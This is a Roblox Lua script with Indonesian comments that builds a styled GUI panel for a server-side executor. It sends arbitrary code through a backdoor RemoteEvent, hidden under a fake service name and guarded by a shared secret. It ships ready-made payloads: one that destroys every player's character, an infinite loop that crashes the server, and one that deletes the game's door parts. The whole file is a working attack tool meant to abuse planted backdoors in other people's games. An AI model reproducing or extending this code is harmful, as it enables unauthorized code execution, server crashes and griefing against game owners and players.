--[[ 
    PRABBBZ MASTER SS - ULTRA EDITION
    Design: Dark Chrome / Neon Accent
]]

local SECRET = "PRABBBZ_INTERNAL_99" -- Harus sama dengan di backdoor
local TargetRemote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("NetworkSyncHandler")

-- UI CONSTRUCTION (MEWAH & BISA DIGESER)
local UI = Instance.new("ScreenGui", game:GetService("CoreGui"))
local Main = Instance.new("Frame", UI)
Main.Size = UDim2.new(0, 600, 0, 400)
Main.Position = UDim2.new(0.5, -300, 0.5, -200)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

-- Gradient & Rounding
local UIGradient = Instance.new("UIGradient", Main)
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 20)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 40))
}
local UICorner = Instance.new("UICorner", Main); UICorner.CornerRadius = UDim.new(0, 15)

-- HEADER
local Header = Instance.new("Frame", Main)
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundTransparency = 1

local Title = Instance.new("TextLabel", Header)
Title.Text = "P R A B B B Z   S Y S T E M S"
Title.Size = UDim2.new(1, 0, 1, 0)
Title.TextColor3 = Color3.fromRGB(0, 200, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18

-- PENGATURAN HALAMAN (PISAH FITUR)
local Container = Instance.new("Frame", Main)
Container.Position = UDim2.new(0, 150, 0, 60)
Container.Size = UDim2.new(1, -160, 1, -70)
Container.BackgroundTransparency = 1

local function CreateTab(name)
    local f = Instance.new("ScrollingFrame", Container)
    f.Size = UDim2.new(1, 0, 1, 0)
    f.BackgroundTransparency = 1
    f.ScrollBarThickness = 2
    f.Visible = false
    local l = Instance.new("UIListLayout", f); l.Padding = UDim.new(0, 10)
    return f
end

local Tabs = {
    Main = CreateTab("Main"),
    Scripts = CreateTab("Library"),
    Abuse = CreateTab("Mass")
}
Tabs.Main.Visible = true

-- SIDEBAR NAV (DROPDOWN STYLE)
local Sidebar = Instance.new("Frame", Main)
Sidebar.Size = UDim2.new(0, 130, 1, -60)
Sidebar.Position = UDim2.new(0, 10, 0, 60)
Sidebar.BackgroundTransparency = 1
local SList = Instance.new("UIListLayout", Sidebar); SList.Padding = UDim.new(0, 5)

local function NavBtn(text, tab)
    local b = Instance.new("TextButton", Sidebar)
    b.Size = UDim2.new(1, 0, 0, 40)
    b.Text = text
    b.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function()
        for _, t in pairs(Tabs) do t.Visible = false end
        tab.Visible = true
    end)
end

NavBtn("General", Tabs.Main)
NavBtn("Library", Tabs.Scripts)
NavBtn("Destruction", Tabs.Abuse)

-- FUNGSI EKSEKUSI (Jantung Script)
local function RunSS(code)
    if TargetRemote then
        TargetRemote:FireServer(SECRET, code)
    else
        warn("BACKDOOR TIDAK DITEMUKAN!")
    end
end

-- ISI LIBRARY (CONTOH)
local function AddItem(tab, name, desc, code)
    local item = Instance.new("Frame", tab)
    item.Size = UDim2.new(0.95, 0, 0, 60)
    item.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    Instance.new("UICorner", item)
    
    local t = Instance.new("TextLabel", item)
    t.Text = "  " .. name; t.Size = UDim2.new(0.6, 0, 0.5, 0); t.TextColor3 = Color3.new(1,1,1); t.BackgroundTransparency = 1; t.TextXAlignment = 0
    
    local d = Instance.new("TextLabel", item)
    d.Text = "  " .. desc; d.Position = UDim2.new(0, 0, 0.5, 0); d.Size = UDim2.new(0.6, 0, 0.5, 0); d.TextColor3 = Color3.new(0.6,0.6,0.6); d.BackgroundTransparency = 1; d.TextXAlignment = 0; d.TextSize = 10

    local run = Instance.new("TextButton", item)
    run.Text = "RUN"; run.Size = UDim2.new(0.3, 0, 0.7, 0); run.Position = UDim2.new(0.65, 0, 0.15, 0); run.BackgroundColor3 = Color3.fromRGB(0, 150, 255); run.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", run)
    
    run.MouseButton1Click:Connect(function() RunSS(code) end)
end

-- DAFTAR SCRIPT LIBRARY (Kamu bisa tambah sampai ratusan)
AddItem(Tabs.Scripts, "FE Kill All", "Menghapus semua karakter player", "for _,p in pairs(game.Players:GetPlayers()) do p.Character:Destroy() end")
AddItem(Tabs.Abuse, "Server Crash", "Menghentikan server (Lags)", "while true do end")
AddItem(Tabs.Main, "Unlock All Doors", "Menghapus semua part bernama Door", "for _,v in pairs(workspace:GetDescendants()) do if v.Name == 'Door' then v:Destroy() end end")

print("PRABBBZ SS PANEL READY.")
